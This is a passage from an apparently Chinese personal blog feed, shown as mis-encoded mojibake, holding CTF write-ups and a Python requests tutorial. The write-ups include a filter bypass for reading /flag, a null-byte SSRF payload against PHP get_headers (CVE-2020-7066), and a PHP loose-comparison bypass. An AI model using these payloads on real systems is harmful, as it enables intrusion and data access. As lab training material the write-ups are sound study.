ç±»ä¼¼ï¼Œä½†æ˜¯æ¯” more æ›´å¥½çš„æ˜¯ï¼Œä»–å¯ä»¥[pg dn][pg up]ç¿»é¡µ</p><p>(3)head:æŸ¥çœ‹å¤´å‡ è¡Œ</p><p>(4)tac:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„åå‘æ˜¾ç¤º</p><p>(5)tail:æŸ¥çœ‹å°¾å‡ è¡Œ</p><p>(6)nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·</p><p>(7)od:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹</p><p>(8)vi:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹</p><p>(9)vim:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹</p><p>(10)sort:å¯ä»¥æŸ¥çœ‹</p><p>(11)uniq:å¯ä»¥æŸ¥çœ‹</p><p>(12)file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹</p><p>ç°åœ¨æœ‰ç‚¹ä¸å¤§æ‡‚å¾—æ˜¯ï¼Œæˆ‘çœ‹å…¶ä»–äººçš„wpä½¿ç”¨çš„æ˜¯ca\t /flag,ä½†æ˜¯\ä¸æ˜¯è¢«è¿‡æ»¤äº†å˜›</p><p>å…ˆçœ‹è¿™æ®µä»£ç </p><p>$cmd=â€™\â€˜;</p><p>if (preg_match(â€˜/?|\|\\â€˜,$cmd)){</p><p>   echo(â€˜nononoâ€™);</p><p>}</p><p>else{</p><p>   echo(â€˜yesâ€™);</p><p>}</p><p>è¾“å‡ºyesï¼Œå°±æ˜¯æ²¡æœ‰è¿‡æ»¤\</p><p>é—®é¢˜å‡ºç°åœ¨å‰é¢çš„ä¸¤ä¸ª\ï¼Œå› ä¸ºæ­£åˆ™è¡¨è¾¾å¼æ˜¯é€šè¿‡äº†ä¸¤å±‚è§£æï¼Œä¸€å±‚æ˜¯phpçš„ï¼Œä¸€å±‚æ˜¯æ­£åˆ™çš„</p><p>å‰é¢ä¸¤ä¸ª\ï¼Œç»è¿‡phpè§£æå™¨è§£æåæˆä¸ºäº†\ï¼Œ|å› ä¸ºæ˜¯phpä¸­çš„ä¿ç•™ç¬¦å·ï¼Œæ‰€ä»¥éœ€è¦ä¸€ä¸ªè½¬ä¹‰\æ¥åŒ¹é…ï¼Œæ‰€ä»¥çŒœæµ‹åº”è¯¥å°±å¯¹|\çš„åŒ¹é…ï¼Œå°è¯•ï¼Œè¾“å…¥$cmd=|\,yes</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GKCVEï¼Œactf backupfile</title>
      <link href="/2021/02/28/GKCVE/"/>
      <url>/2021/02/28/GKCVE/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>é¢˜ç›®åœ°å€ï¼š<a href="http://4a33f32c-6c18-4ed6-90da-d9700899205b.node3.buuoj.cn/">http://4a33f32c-6c18-4ed6-90da-d9700899205b.node3.buuoj.cn</a></p><p>æ‰“å¼€é¢˜ç›®vintï¼Œæç¤ºæ˜¯cve 2020 7066</p><p>ä¸Šç½‘æŸ¥èµ„æ–™</p><p>get_headers(url)ï¼Œè·å–urlçš„å¤´ä¿¡æ¯ï¼Œä»¥æ•°ç»„çš„å½¢å¼è¿”å›</p><p>è¿˜æœ‰get_headers(url,1)</p><pre><code>&lt;?php$url = &#39;http://4a33f32c-6c18-4ed6-90da-d9700899205b.node3.buuoj.cn/?url=www.ctfhub.com&#39;;print_r(get_headers($url));print_r(&#39;--------------------------------------------------------------------------------&#39;);print_r(get_headers($url, 1));?&gt;</code></pre><p>ä»è¿”å›ä¿¡æ¯ä¸­ï¼Œå¯ä»¥çœ‹å‡ºä¸¤è€…çš„åŒºåˆ«</p><p>Array ( [0] =&gt; HTTP/1.1 200 OK [1] =&gt; Server: openresty [2] =&gt; Date: Sun, 28 Feb 2021 04:29:27 GMT [3] =&gt; Content-Type: text/html; charset=UTF-8 [4] =&gt; Connection: close [5] =&gt; Hint: Flag in localhost [6] =&gt; Tips: Host must be end with â€˜123â€™ [7] =&gt; Vary: Accept-Encoding [8] =&gt; X-Powered-By: PHP/7.3.15 ) â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“Array ( [0] =&gt; HTTP/1.1 200 OK [Server] =&gt; openresty [Date] =&gt; Sun, 28 Feb 2021 04:29:27 GMT [Content-Type] =&gt; text/html; charset=UTF-8 [Connection] =&gt; close [Hint] =&gt; Flag in localhost [Tips] =&gt; Host must be end with â€˜123â€™ [Vary] =&gt; Accept-Encoding [X-Powered-By] =&gt; PHP/7.3.15 ) </p><p>å¹¶ä¸”ï¼Œå¯ä»¥é€šè¿‡\0ï¼ˆä¸çŸ¥é“ä¸ºå•¥ï¼Œåœ¨æˆ‘ç”µè„‘ä¸Š\0ä½¿ç”¨ä¸äº†ï¼Œç”¨çš„æ˜¯%00ï¼Œå°±ç›¸å½“äº%00æˆªæ–­ï¼‰è¿›è¡Œé˜¶æ®µï¼Œæ¯”å¦‚æˆ‘ä»¬è¾“å…¥url=â€˜httpï¼š//127.0.0.1%00<a href="http://www.ctfhub.comâ€™,å®é™…ä¸Šå¾—åˆ°çš„æ˜¯httpï¼š//127.0.0.1">www.ctfhub.comâ€™,å®é™…ä¸Šå¾—åˆ°çš„æ˜¯httpï¼š//127.0.0.1</a></p><h2>å›åˆ°é¢˜ç›®</h2><p>æˆ‘ä»¬ç‚¹å¼€é‚£ä¸ªctfhubä¹‹åå°±æ˜¯å¾ˆé•¿çš„ä¸€æ®µæ•°ç»„ï¼Œæ²¡ä»€ä¹ˆå¤´ç»ªï¼Œé‡Œé¢æ²¡ä»€ä¹ˆæç¤ºï¼Œæˆ‘æƒ³ï¼Œä»–çš„æºç åº”è¯¥æ˜¯ url=$_GET[â€˜urlâ€™],get_headers(url),ç„¶åæˆ‘å°±å°è¯•åœ¨æœ¬åœ°æµ‹è¯•</p><pre><code>&lt;?php$url = &#39;http://4a33f32c-6c18-4ed6-90da-d9700899205b.node3.buuoj.cn/?url=www.ctfhub.com&#39;;print_r(get_headers($url));print_r(&#39;--------------------------------------------------------------------------------&#39;);print_r(get_headers($url, 1));</code></pre><p>å¾—åˆ°æç¤ºï¼Œå…¶å®è¿™ä¸ªå°±æ˜¯å¾—åˆ°å®ƒçš„è¯·æ±‚æ ‡å¤´ï¼Œå…¶å®å¯ä»¥æŠ“åŒ…åè¿›è¡ŒæŸ¥çœ‹ï¼Œhintï¼šflag in localhost tips:host å¿…éœ€æ˜¯123 ç»“å°¾</p><p>è¾“å…¥<a href="http://4a33f32c-6c18-4ed6-90da-d9700899205b.node3.buuoj.cn/?url=http%EF%BC%9A//127.0.0.123%00www.ctfhub.com&#39;%EF%BC%8C%E5%BE%97%E5%88%B0flag%EF%BC%8C%E5%B9%B6%E4%B8%94%E6%88%91%E5%86%99%E7%9A%84%E6%97%B6%E5%80%99%E5%9B%A0%E4%B8%BA%E6%8F%90%E7%A4%BA%E7%9A%84%E6%98%AF%E8%AF%B4localhost%EF%BC%8C%E6%88%91%E5%B0%B1%E5%86%99%E7%9A%84http://4a33f32c-6c18-4ed6-90da-d9700899205b.node3.buuoj.cn/?url=http://localhost%00www.ctfhub.com&#39;,%E4%BD%86%E6%98%AF%E9%82%A3%E4%B8%AA123%EF%BC%8C%E6%88%91%E4%B8%8D%E7%9F%A5%E9%81%93%E8%AF%A5%E6%80%8E%E4%B9%88%E5%8A%9E%E4%BA%86%EF%BC%8C%E6%88%91%E5%8F%88%E6%83%B3%E8%AF%B4%E6%98%AF%E5%9C%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E4%B8%ADhost%E4%BF%AE%E6%94%B9%E4%BB%A5123%EF%BC%8C%E7%BB%93%E5%B0%BE%E6%89%8D%E5%8F%91%E7%8E%B0%E4%B8%8D%E6%98%AF%EF%BC%8C%E5%B0%B1%E7%9B%B4%E6%8E%A5127.0.0.123%EF%BC%8Cok">http://4a33f32c-6c18-4ed6-90da-d9700899205b.node3.buuoj.cn/?url=httpï¼š//127.0.0.123%00www.ctfhub.com&#39;ï¼Œå¾—åˆ°flagï¼Œå¹¶ä¸”æˆ‘å†™çš„æ—¶å€™å› ä¸ºæç¤ºçš„æ˜¯è¯´localhostï¼Œæˆ‘å°±å†™çš„http://4a33f32c-6c18-4ed6-90da-d9700899205b.node3.buuoj.cn/?url=http://localhost%00www.ctfhub.com&#39;,ä½†æ˜¯é‚£ä¸ª123ï¼Œæˆ‘ä¸çŸ¥é“è¯¥æ€ä¹ˆåŠäº†ï¼Œæˆ‘åˆæƒ³è¯´æ˜¯åœ¨è¯·æ±‚å¤´ä¸­hostä¿®æ”¹ä»¥123ï¼Œç»“å°¾æ‰å‘ç°ä¸æ˜¯ï¼Œå°±ç›´æ¥127.0.0.123ï¼Œok</a></p><h1>actf backupfile</h1><p>å› ä¸ºè¯´æ˜¯å¤‡ä»½æ–‡ä»¶ï¼Œæˆ‘å°±æ˜¯äº†ä¸‹index.php.bakï¼Œç„¶åå°±å‡ºæ¥äº†</p><pre><code>&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET[&#39;key&#39;])) &#123;$key = $_GET[&#39;key&#39;];if(!is_numeric($key)) &#123;    exit(&quot;Just num!&quot;);&#125;$key = intval($key);$str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;if($key == $str) &#123;    echo $flag;&#125;&#125;else &#123;echo &quot;Try to find out source file!&quot;;&#125;</code></pre><p>è¿™ä¸å°±æ˜¯phpå¼±ç±»å‹ï¼Œå°±ç›´æ¥?key=123ï¼Œå°±å¥½äº†</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç§‹åå±±è½¦ç¥</title>
      <link href="/2021/02/26/%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/"/>
      <url>/2021/02/26/%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>import requests<br>import bs4</p><p>url=â€™your urlâ€™<br>session=requests.session()</p><p>re=session.get(url)</p><p>content=re.content</p><p>res=bs4.BeautifulSoup(content,â€™lxmlâ€™)</p><p>res=str(res.find(â€˜divâ€™)).split(â€˜=â€™)[0].split(â€˜&gt;â€™)[1]</p><p>value=eval(res)</p><p>data={â€˜valueâ€™:value}</p><p>rep=requests.get(â€˜yoururlâ€™,data=data)</p><p>print(rep.text)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>request</title>
      <link href="/2021/02/26/request/"/>
      <url>/2021/02/26/request/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>é™†é™†ç»­ç»­å­¦ä¹ äº†ä¸€äº›pythonçš„åŸºç¡€çŸ¥è¯†ï¼Œæ„Ÿè§‰æœ‰å¿…è¦å¼€å§‹å¯¹æ¨¡å—çš„å­¦ä¹ äº†</p><h1>æ¨¡å—è¯´æ˜</h1><p>requesræ”¯æŒhttpè¿æ¥ä¿æŒå’Œè¿æ¥æ± ï¼Œæ”¯æŒä½¿ç”¨cookieæ¥ä¿æŒä¼šè¯ï¼Œæ”¯æŒæ–‡ä»¶ä¸Šä¼ ï¼Œæ”¯æŒç›¸åº”å†…å®¹è‡ªåŠ¨ç¼–ç ï¼Œæ”¯æŒå›½é™…åŒ–çš„urlå’Œpostæ•°æ®è‡ªåŠ¨è¿æ¥</p><p>åœ¨pythonå†…ç½®æ¨¡å—ä¸­è¿›è¡Œäº†é«˜åº¦çš„å°è£…ï¼Œä½¿pythonåœ¨è¿›è¡Œç½‘ç»œè¯·æ±‚çš„æ—¶å€™ï¼Œå¯ä»¥è½»è€Œæ˜“ä¸¾åœ°å®Œæˆæµè§ˆå™¨çš„æ‰€æœ‰æ“ä½œ</p><p>requestsä¼šè‡ªåŠ¨å®ç°æŒä¹…è¿æ¥ï¼Œkeep alive</p><h1>åŸºç¡€å…¥é—¨</h1><h2>å¯¼å…¥æ¨¡å—</h2><p>import requests</p><h2>å‘é€ç®€æ´çš„è¯·æ±‚</h2>ç¤ºä¾‹ï¼šè·å¾—ä¸€ä¸ªä¸ªäººç½‘é¡µ<p>import requests</p><p>r=requests.get(â€˜<a href="https://ckylsy.github.io/&#39;)(%E4%B8%8D%E5%B8%A6%E5%8F%82%E6%95%B0)">https://ckylsy.github.io/&#39;)(ä¸å¸¦å‚æ•°)</a><br>r1=requests.get(url=â€™<a href="http://dict.baidu.com/s&#39;">http://dict.baidu.com/s&#39;</a>, params={â€˜wdâ€™: â€˜pythonâ€™})(<a href="http://dict.baidu.com/s?wd=python">http://dict.baidu.com/s?wd=python</a>)</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¯¥æ–¹æ³•ä½¿ç”¨ä»¥ä¸‹å„ç§æ–¹æ³•</p><p>1   requests.get(â€˜<a href="https://github.com/timeline.json%E2%80%99">https://github.com/timeline.jsonâ€™</a>)                                # GETè¯·æ±‚</p><p>2   requests.post(â€œ<a href="http://httpbin.org/post%E2%80%9D">http://httpbin.org/postâ€</a>)                                        # POSTè¯·æ±‚</p><p>3   requests.put(â€œ<a href="http://httpbin.org/put%E2%80%9D">http://httpbin.org/putâ€</a>)                                          # PUTè¯·æ±‚</p><p>4   requests.delete(â€œ<a href="http://httpbin.org/delete%E2%80%9D">http://httpbin.org/deleteâ€</a>)                                    # DELETEè¯·æ±‚</p><p>5   requests.head(â€œ<a href="http://httpbin.org/get%E2%80%9D">http://httpbin.org/getâ€</a>)                                         # HEADè¯·æ±‚</p><p>6   requests.options(â€œ<a href="http://httpbin.org/get%E2%80%9D">http://httpbin.org/getâ€</a> )                                     # OPTIONSè¯·æ±‚</p><h2>ä¸ºurlä¼ é€’å‚æ•°</h2><p>url_params={â€˜keyâ€™:â€™pythonâ€™}   #å­—å…¸ä¼ é€’å‚æ•°ï¼Œå¦‚æœæ˜¯å€¼ä¸ºnoneçš„é”®ä¸ä¼šè¢«æ·»åŠ åˆ°urlä¸­<br>r=requests.get(â€˜your_urlâ€™,params=url_params)</p><p>r=your urlï¼Ÿkey =value</p><h2>å“åº”å†…å®¹</h2><p>r.encoding:è·å¾—å½“å‰ç¼–ç </p><p>r.encoding=â€˜utf-8â€™è®¾ç½®ç¼–ç </p><p>r.text:ä»¥encodingè§£æè¿”å›å†…å®¹ï¼Œå¦‚æœæ˜¯å­—ç¬¦ä¸²çš„æ¶ˆæ¯ä½“ï¼Œåˆ™æ ¹æ®å“åº”å¤´çš„ç¼–ç è¿›è¡Œè§£ç </p><p>r.content:ä»¥å­—èŠ‚å½¢åŠ¿ï¼ˆäºŒè¿›åˆ¶ï¼‰æ¥å‘æŒ¥å†…å®¹ï¼Œå­—èŠ‚æ–¹å¼çš„å“åº”ä½“ä¼šè‡ªåŠ¨ä¸ºä½ è§£ç ï¼Œgzipå’Œdeflasteè¿›è¡Œå‹ç¼©</p><p>r.headers:ä»¥å­—å…¸çš„æ–¹å¼è¿”å›å“åº”ä½“ï¼Œè¿™ä¸ªå­—å…¸çš„é”®ä¸åŒºåˆ†å¤§å°å†™ï¼Œå¦‚æœé”®ä¸å­˜åœ¨åˆ™2è¿”å›none</p><p>r.status_code:è¿”å›çŠ¶æ€ç ï¼Œå…¶å®ç›´æ¥è¾“å…¥printï¼ˆrï¼‰å°±å¯ä»¥çš„å¾—åˆ°</p><p>r.raw:è¿”å›åŸå§‹å“åº”ä½“ï¼Œå³urllibçš„responseå¯¹è±¡ï¼Œä½¿ç”¨r.raw.read()</p><p>r.ok:è¿”å›boolå€¼ï¼Œä¾¿å¯æŸ¥çœ‹æ˜¯å¦ç™»é™†æˆåŠŸ</p><p>r.json():requestsä¸­çš„å†…ç½®jsonè§£ç å™¨ï¼Œä»¥jsonçš„å½¢å¼è¿”å›ï¼Œå‰ææ˜¯è¿”å›çš„å†…å®¹ä½¿jsonæ ¼å¼çš„ï¼Œå¦åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸</p><p>r.raise_for_status():å¤±è´¥è¯·æ±‚æŠ›å‡ºå¼‚å¸¸</p><p>postå‘å‡ºjsonè¯·æ±‚</p><p> import requests</p><p> import json</p><p> r = requests.post(â€˜<a href="https://api.github.com/some/endpoint&#39;">https://api.github.com/some/endpoint&#39;</a>, data=json.dumps({â€˜someâ€™: â€˜dataâ€™}))</p><p> print(r.json()</p><h2>å®šåˆ¶å¤´å’Œcookieä¿¡æ¯</h2><p>header={â€˜user-agentâ€™:â€™my-app/0.01â€™}</p><p>cookie={â€˜keyâ€™:â€™valueâ€™}</p><p>r=requests.get/post(â€˜your urlâ€™,hear)<br>//<br>data={â€˜someâ€™:â€™dataâ€™}</p><p>headers={â€˜content-typeâ€™: â€˜application/jsonâ€™,â€™User-Agentâ€™: â€˜Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0â€™}</p><p>r = requests.post(â€˜<a href="https://api.github.com/some/endpoint&#39;">https://api.github.com/some/endpoint&#39;</a>, data=data, headers=headers)</p><p>print(r.text)</p><h2>å“åº”</h2><p>r.headers:è¿”å›å­—å…¸ç±»å‹ï¼Œå¤´ä¿¡æ¯</p><p>r.requests.headers:è¿”å›å‘é€åˆ°æœåŠ¡å™¨çš„å¤´ä¿¡æ¯</p><p>æµ‹è¯•äº†ä¸€ä¸‹ï¼š{â€˜User-Agentâ€™: â€˜python-requests/2.25.1â€™, â€˜Accept-Encodingâ€™: â€˜gzip, deflateâ€™, â€˜Acceptâ€™: â€˜<em>/</em>â€˜, â€˜Connectionâ€™: â€˜keep-aliveâ€™} r.requests.headers<br>{â€˜Serverâ€™: â€˜nginxâ€™, â€˜Dateâ€™: â€˜Fri, 26 Feb 2021 06:04:34 GMTâ€™, â€˜Content-Typeâ€™: â€˜text/htmlâ€™, â€˜Transfer-Encodingâ€™: â€˜chunkedâ€™, â€˜Connectionâ€™: â€˜keep-aliveâ€™, â€˜Varyâ€™: â€˜Accept-Encodingâ€™, â€˜Content-Encodingâ€™: â€˜gzipâ€™} r.headers</p><p>r.cookies è¿”å›cookie</p><p>r.history è¿”å›é‡å®šå‘ä¿¡æ¯ï¼Œå½“ç„¶å¯ä»¥åœ¨è¯·æ±‚å¤´ä¸ŠåŠ ä¸Šallow_redirects=falseé˜»æ­¢é‡å®šå‘</p><h2>è¶…æ—¶</h2>r=requests.gets('url',timeout=1)è®¾ç½®ç§’æ•°è¶…æ—¶ï¼Œä»…å¯¹äºè¿æ¥æœ‰æ•ˆ<h2>ä¼šè¯å¯¹è±¡ï¼Œèƒ½å¤Ÿè·¨è¯·æ±‚ä¿æŒå‚æ•°</h2>s=requests.session()<p>s.auth=(â€˜authâ€™,â€™passwdâ€™)</p><p>s.headers=(â€˜keyâ€™:â€™valueâ€™)</p><p>r=s.get(â€˜urlâ€™)</p><p>r=s.get(â€˜url1â€™)</p><h2>ä»£ç†</h2><p>proxies={â€˜httpâ€™:â€™ip1â€™,â€™httpsâ€™:â€™ip2â€™}</p><p>requests.get(â€˜urlâ€™,proxies=proxies)</p><h2>æ±‡æ€»</h2><h1 id="HTTPè¯·æ±‚ç±»å‹"><a href="#HTTPè¯·æ±‚ç±»å‹" class="headerlink" title="HTTPè¯·æ±‚ç±»å‹"></a>HTTPè¯·æ±‚ç±»å‹</h1><h1 id="getç±»å‹"><a href="#getç±»å‹" class="headerlink" title="getç±»å‹"></a>getç±»å‹</h1><p>r = requests.get(â€˜<a href="https://github.com/timeline.json&#39;">https://github.com/timeline.json&#39;</a>)</p><h1 id="postç±»å‹"><a href="#postç±»å‹" class="headerlink" title="postç±»å‹"></a>postç±»å‹</h1><p>r = requests.post(â€œ<a href="http://m.ctrip.com/post&quot;">http://m.ctrip.com/post&quot;</a>)</p><h1 id="putç±»å‹"><a href="#putç±»å‹" class="headerlink" title="putç±»å‹"></a>putç±»å‹</h1><p>r = requests.put(â€œ<a href="http://m.ctrip.com/put&quot;">http://m.ctrip.com/put&quot;</a>)</p><h1 id="deleteç±»å‹"><a href="#deleteç±»å‹" class="headerlink" title="deleteç±»å‹"></a>deleteç±»å‹</h1><p>r = requests.delete(â€œ<a href="http://m.ctrip.com/delete&quot;">http://m.ctrip.com/delete&quot;</a>)</p><h1 id="headç±»å‹"><a href="#headç±»å‹" class="headerlink" title="headç±»å‹"></a>headç±»å‹</h1><p>r = requests.head(â€œ<a href="http://m.ctrip.com/head&quot;">http://m.ctrip.com/head&quot;</a>)</p><h1 id="optionsç±»å‹"><a href="#optionsç±»å‹" class="headerlink" title="optionsç±»å‹"></a>optionsç±»å‹</h1><p>r = requests.options(â€œ<a href="http://m.ctrip.com/get&quot;">http://m.ctrip.com/get&quot;</a>)</p><h1 id="è·å–å“åº”å†…å®¹"><a href="#è·å–å“åº”å†…å®¹" class="headerlink" title="è·å–å“åº”å†…å®¹"></a>è·å–å“åº”å†…å®¹</h1><p>print(r.content) #ä»¥å­—èŠ‚çš„æ–¹å¼å»æ˜¾ç¤ºï¼Œä¸­æ–‡æ˜¾ç¤ºä¸ºå­—ç¬¦</p><p>print(r.text) #ä»¥æ–‡æœ¬çš„æ–¹å¼å»æ˜¾ç¤º</p><p>#URLä¼ é€’å‚æ•°<br>payload = {â€˜keywordâ€™: â€˜é¦™æ¸¯â€™, â€˜salecityidâ€™: â€˜2â€™}<br>r = requests.get(â€œ<a href="http://m.ctrip.com/webapp/tourvisa/visa_list&quot;">http://m.ctrip.com/webapp/tourvisa/visa_list&quot;</a>, params=payload)<br>printï¼ˆr.urlï¼‰ #ç¤ºä¾‹ä¸º<a href="http://m.ctrip.com/webapp/tourvisa/visa_list?salecityid=2&amp;keyword=%E9%A6%99%E6%B8%AF">http://m.ctrip.com/webapp/tourvisa/visa_list?salecityid=2&amp;keyword=é¦™æ¸¯</a></p><p>#è·å–/ä¿®æ”¹ç½‘é¡µç¼–ç <br>r = requests.get(â€˜<a href="https://github.com/timeline.json&#39;">https://github.com/timeline.json&#39;</a>)</p><p>print ï¼ˆr.encodingï¼‰</p><p>#jsonå¤„ç†<br>r = requests.get(â€˜<a href="https://github.com/timeline.json&#39;">https://github.com/timeline.json&#39;</a>)</p><p>printï¼ˆr.json()ï¼‰ # éœ€è¦å…ˆimport json    </p><h1 id="å®šåˆ¶è¯·æ±‚å¤´"><a href="#å®šåˆ¶è¯·æ±‚å¤´" class="headerlink" title="å®šåˆ¶è¯·æ±‚å¤´"></a>å®šåˆ¶è¯·æ±‚å¤´</h1><p>url = â€˜<a href="http://m.ctrip.com&/#39;">http://m.ctrip.com&#39;</a></p><p>headers = {â€˜User-Agentâ€™ : â€˜Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 4 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19â€™}</p><p>r = requests.post(url, headers=headers)</p><p>print ï¼ˆr.request.headers)</p><p>#å¤æ‚postè¯·æ±‚<br>url = â€˜<a href="http://m.ctrip.com&/#39;">http://m.ctrip.com&#39;</a></p><p>payload = {â€˜someâ€™: â€˜dataâ€™}</p><p>r = requests.post(url, data=json.dumps(payload)) #å¦‚æœä¼ é€’çš„payloadæ˜¯stringè€Œä¸æ˜¯dictï¼Œéœ€è¦å…ˆè°ƒç”¨dumpsæ–¹æ³•æ ¼å¼åŒ–ä¸€ä¸‹</p><h1 id="postå¤šéƒ¨åˆ†ç¼–ç æ–‡ä»¶"><a href="#postå¤šéƒ¨åˆ†ç¼–ç æ–‡ä»¶" class="headerlink" title="postå¤šéƒ¨åˆ†ç¼–ç æ–‡ä»¶"></a>postå¤šéƒ¨åˆ†ç¼–ç æ–‡ä»¶</h1><p>url = â€˜<a href="http://m.ctrip.com&/#39;">http://m.ctrip.com&#39;</a></p><p>files = {â€˜fileâ€™: open(â€˜report.xlsâ€™, â€˜rbâ€™)}</p><p>r = requests.post(url, files=files)</p><h1 id="å“åº”çŠ¶æ€ç "><a href="#å“åº”çŠ¶æ€ç " class="headerlink" title="å“åº”çŠ¶æ€ç "></a>å“åº”çŠ¶æ€ç </h1><p>r = requests.get(â€˜<a href="http://m.ctrip.com&/#39;">http://m.ctrip.com&#39;</a>)</p><p>print(r.status_code)</p><h1 id="å“åº”å¤´"><a href="#å“åº”å¤´" class="headerlink" title="å“åº”å¤´"></a>å“åº”å¤´</h1><p>r = requests.get(â€˜<a href="http://m.ctrip.com&/#39;">http://m.ctrip.com&#39;</a>)</p><p>print (r.headers)</p><p>print (r.headers[â€˜Content-Typeâ€™])</p><p>print (r.headers.get(â€˜content-typeâ€™)) #è®¿é—®å“åº”å¤´éƒ¨åˆ†å†…å®¹çš„ä¸¤ç§æ–¹å¼</p><h1 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h1><p>url = â€˜<a href="http://example.com/some/cookie/setting/url&#39;">http://example.com/some/cookie/setting/url&#39;</a></p><p>r = requests.get(url)</p><p>r.cookies[â€˜example_cookie_nameâ€™]    #è¯»å–cookies</p><p>url = â€˜<a href="http://m.ctrip.com/cookies&#39;">http://m.ctrip.com/cookies&#39;</a></p><p>cookies = dict(cookies_are=â€™workingâ€™)</p><p>r = requests.get(url, cookies=cookies) #å‘é€cookies</p><p>#è®¾ç½®è¶…æ—¶æ—¶é—´<br>r = requests.get(â€˜<a href="http://m.ctrip.com&/#39;">http://m.ctrip.com&#39;</a>, timeout=0.001)</p><p>#è®¾ç½®è®¿é—®ä»£ç†<br>proxies = {<br>           â€œhttpâ€: â€œ<a href="http://10.10.1.10:3128&quot;">http://10.10.1.10:3128&quot;</a>,<br>           â€œhttpsâ€: â€œ<a href="http://10.10.1.100:4444&quot;">http://10.10.1.100:4444&quot;</a>,<br>          }</p><p>r = requests.get(â€˜<a href="http://m.ctrip.com&/#39;">http://m.ctrip.com&#39;</a>, proxies=proxies)</p><p>#å¦‚æœä»£ç†éœ€è¦ç”¨æˆ·åå’Œå¯†ç ï¼Œåˆ™éœ€è¦è¿™æ ·ï¼š</p><p>proxies = {<br>    â€œhttpâ€: â€œ<a href="http://user:pass@10.10.1.10:3128/&quot;">http://user:pass@10.10.1.10:3128/&quot;</a>,<br>}</p><h2>ä»£ç ç¤ºä¾‹</h2><h1 id="1ã€æ— å‚æ•°å®ä¾‹"><a href="#1ã€æ— å‚æ•°å®ä¾‹" class="headerlink" title="1ã€æ— å‚æ•°å®ä¾‹"></a>1ã€æ— å‚æ•°å®ä¾‹</h1><p>import requests</p><p>ret = requests.get(â€˜<a href="https://github.com/timeline.json&#39;">https://github.com/timeline.json&#39;</a>)</p><p>print(ret.url)<br>print(ret.text)</p><h1 id="2ã€æœ‰å‚æ•°å®ä¾‹"><a href="#2ã€æœ‰å‚æ•°å®ä¾‹" class="headerlink" title="2ã€æœ‰å‚æ•°å®ä¾‹"></a>2ã€æœ‰å‚æ•°å®ä¾‹</h1><p>import requests</p><p>payload = {â€˜key1â€™: â€˜value1â€™, â€˜key2â€™: â€˜value2â€™}</p><p>ret = requests.get(â€œ<a href="http://httpbin.org/get&quot;">http://httpbin.org/get&quot;</a>, params=payload)</p><p>print(ret.url)</p><p>print(ret.text)</p><h1 id="1ã€åŸºæœ¬POSTå®ä¾‹"><a href="#1ã€åŸºæœ¬POSTå®ä¾‹" class="headerlink" title="1ã€åŸºæœ¬POSTå®ä¾‹"></a>1ã€åŸºæœ¬POSTå®ä¾‹</h1><p>import requests</p><p>payload = {â€˜key1â€™: â€˜value1â€™, â€˜key2â€™: â€˜value2â€™}</p><p>ret = requests.post(â€œ<a href="http://httpbin.org/post&quot;">http://httpbin.org/post&quot;</a>, data=payload)</p><p>print(ret.text)</p><h1 id="2ã€å‘é€è¯·æ±‚å¤´å’Œæ•°æ®å®ä¾‹"><a href="#2ã€å‘é€è¯·æ±‚å¤´å’Œæ•°æ®å®ä¾‹" class="headerlink" title="2ã€å‘é€è¯·æ±‚å¤´å’Œæ•°æ®å®ä¾‹"></a>2ã€å‘é€è¯·æ±‚å¤´å’Œæ•°æ®å®ä¾‹</h1><p>import requests</p><p>import json</p><p>url = â€˜<a href="https://api.github.com/some/endpoint&#39;">https://api.github.com/some/endpoint&#39;</a></p><p>payload = {â€˜someâ€™: â€˜dataâ€™}</p><p>headers = {â€˜content-typeâ€™: â€˜application/jsonâ€™}</p><p>ret = requests.post(url, data=json.dumps(payload), headers=headers)</p><p>print(ret.text)</p><p>print(ret.cookies)</p><p>#! /usr/bin/python3<br>    import requests</p><pre><code>import jsonclass url_request():def __init__(self):    &#39;&#39;&#39; init &#39;&#39;&#39;if __name__ == &#39;__main__&#39;:heard = &#123;&#39;Content-Type&#39;: &#39;application/json&#39;&#125;payload = &#123;&#39;CountryName&#39;: &#39;ä¸­å›½&#39;,           &#39;ProvinceName&#39;: &#39;å››å·çœ&#39;,           &#39;L1CityName&#39;: &#39;chengdu&#39;,           &#39;L2CityName&#39;: &#39;yibing&#39;,           &#39;TownName&#39;: &#39;&#39;,           &#39;Longitude&#39;: &#39;107.33393&#39;,           &#39;Latitude&#39;: &#39;33.157131&#39;,           &#39;Language&#39;: &#39;CN&#39;&#125;r = requests.post(&quot;http://www.xxxxxx.com/CityLocation/json/LBSLocateCity&quot;, heards=heard, data=payload)data = r.json()if r.status_code!=200:    print(&#39;LBSLocateCity API Error&#39; + 